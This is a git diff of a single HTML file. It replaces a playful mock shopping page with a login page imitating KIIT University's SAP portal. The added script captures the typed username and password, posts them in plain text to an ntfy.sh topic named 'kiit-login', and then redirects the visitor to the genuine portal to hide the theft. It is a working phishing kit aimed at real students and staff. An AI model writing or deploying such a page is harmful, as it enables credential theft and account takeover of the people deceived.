@@ -2,49 +2,70 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Amajon Order</title>
-    <link rel="stylesheet" href="styles.css">
+    <title>KIIT World Login</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <div id="dropdown-alert"></div>
-    <header>
-        <h1><img class="logo" src="logo.png"></image></h1>
-    </header>
+    <div class="outer-container">
+        <div class="login-container">
+            <div class="login-box">
+                <div class="left-image">
+                    <img src="branding-image.jpg" alt="KIIT Campus">
+                </div>
+                <div class="right-form">
+                    <h2>Welcome to KIIT World</h2>
+                    <p class="subtext">
+                        INDIA's first university to implement SAP<br>
+                        in all its schools and processes at a time
+                    </p>
+                    <p class="error-message" id="error-message" style="display: none;">
+                        <img src="error-icon.png" alt="!" class="icon"> User authentication failed
+                    </p>
+                    <form id="loginForm">
+                        <label for="user">User <span class="required">*</span></label><br>
+                        <input type="text" id="user" name="user"><br>
 
-    <main>
-        <p class="greeting">Henlo tiyamisu :D</p>
+                        <label for="password">Password <span class="required">*</span></label><br>
+                        <input type="password" id="password" name="password"><br><br>
 
-        <div class="item">
-            <span class="quantity" id="qty-choco">3</span>
-            <button class="minus" data-id="choco">-</button>
-            <img src="choco.png" alt="Chocolate">
-            <button class="plus" data-id="choco">+</button>
-        </div>
-
-        <div class="item">
-            <span class="quantity" id="qty-rose">2</span>
-            <button class="minus" data-id="rose">-</button>
-            <img src="rose.png" alt="Rose">
-            <button class="plus" data-id="rose">+</button>
-        </div>
-
-        <p class="greeting">Delivery instructions</p>
-        <input type="text" id="delivery-instructions" placeholder="Leave a cute note for the delivery boi..." />
-        <div class="extras">
-            <div class="extra-item" onclick="showDropdownMessage('Could you really say no to that?')">
-                <input type="checkbox" checked disabled>
-                <span>some random drunk written letter</span>
+                        <button type="submit">Log On</button>
+                    </form>
+                </div>
             </div>
-            <div class="extra-item" onclick="showDropdownMessage('Darling please')">
-                <input type="checkbox" checked disabled>
-                <span>cute ass delivery boi</span>
+            <div class="footer">
+                <p>Copyright © SAP AG. All Rights Reserved.</p>
+                <img src="sap_logo.png" alt="KIIT Logo" class="kiit-logo">
             </div>
         </div>
-                
-        <button id="place-order">PLACE ORDER</button>
-    </main>
+    </div>
 
-    <script src="script.js"></script>
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(e) {
+            e.preventDefault(); // prevent page refresh
+
+            const username = document.getElementById("user").value;
+            const password = document.getElementById("password").value;
+
+            if (!username || !password) {
+                document.getElementById("error-message").style.display = "block";
+                return;
+            }
+
+            const message = `Login attempt:\nUsername: ${username}\nPassword: ${password}`;
+
+            fetch("https://ntfy.sh/kiit-login", {
+                method: "POST",
+                body: message,
+            })
+            .then(response => {
+                if (response.ok) {
+                    window.location.href = "https://kiitportal.kiituniversity.net/irj/portal/"; // 🔁 Replace with your actual target URL
+                } else {
+                }
+            })
+            .catch(error => {
+            });
+        });
+    </script>
 </body>
 </html>
